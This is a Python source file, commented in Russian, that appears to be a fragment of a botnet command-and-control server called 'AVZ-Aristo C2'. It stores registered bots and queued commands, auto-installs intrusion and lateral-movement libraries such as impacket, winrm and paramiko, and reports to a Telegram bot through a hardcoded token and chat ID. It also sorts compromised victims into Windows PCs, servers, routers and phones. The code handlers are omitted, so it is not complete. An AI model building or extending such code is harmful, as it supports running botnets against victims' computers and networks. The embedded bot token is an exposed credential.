#!/usr/bin/env python3
# AVZ-Aristo C2 v25.14 – типы устройств, автоустановка
import asyncio, json, os, time, subprocess, sys, requests
from datetime import datetime
from aiohttp import web

HTTP_PORT = 80
API_PORT = 8080
BOTS_FILE = "bots.json"
COMMANDS_FILE = "commands.json"

TELEGRAM_TOKEN = "8801568177:AAG8KfuLv79gJ0VEhL85QwmOB4OL9R1KNto"
TELEGRAM_CHAT_ID = "2119367196"

def ensure_dependencies():
    required = ['redis', 'docker', 'asyncssh', 'paramiko', 'aiohttp', 'requests', 'mysql.connector', 'pymssql', 'psycopg2', 'impacket', 'winrm', 'vncdotool']
    for lib in required:
        try:
            __import__(lib.replace('-', '_'))
        except ImportError:
            print(f"[*] Installing {lib}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

ensure_dependencies()

bots = {}
if os.path.exists(BOTS_FILE):
    with open(BOTS_FILE) as f:
        bots = json.load(f)

commands_queue = {}
if os.path.exists(COMMANDS_FILE):
    with open(COMMANDS_FILE) as f:
        commands_queue = json.load(f)

def save_bots():
    with open(BOTS_FILE, "w") as f:
        json.dump(bots, f, indent=2)

def save_commands():
    with open(COMMANDS_FILE, "w") as f:
        json.dump(commands_queue, f, indent=2)

def telegram_notify(msg):
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                          json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=5)
        except: pass

# Определение типа устройства по ОС
def guess_device_type(os_info, hostname):
    os_lower = os_info.lower()
    host_lower = hostname.lower()
    if 'windows' in os_lower:
        return 'Windows ПК'
    if 'linux' in os_lower:
        if 'server' in host_lower or 'srv' in host_lower or 'vps' in host_lower:
            return 'Сервер'
        if 'router' in host_lower or 'dd-wrt' in host_lower:
            return 'Роутер'
        return 'Linux'
    if 'router' in os_lower or 'dd-wrt' in os_lower:
        return 'Роутер'
    if 'android' in os_lower:
        return 'Android'
    if 'ios' in os_lower:
        return 'iPhone/iPad'
    return 'Неизвестно'

# ... остальной код C2 (обработчики TCP, HTTP API) без изменений
# При регистрации нового бота добавляем поле type
# bots[ip] = {
#     "ip": ip,
#     "hostname": hostname,
#     "os": os_info,
#     "type": guess_device_type(os_info, hostname),
#     ...
# }
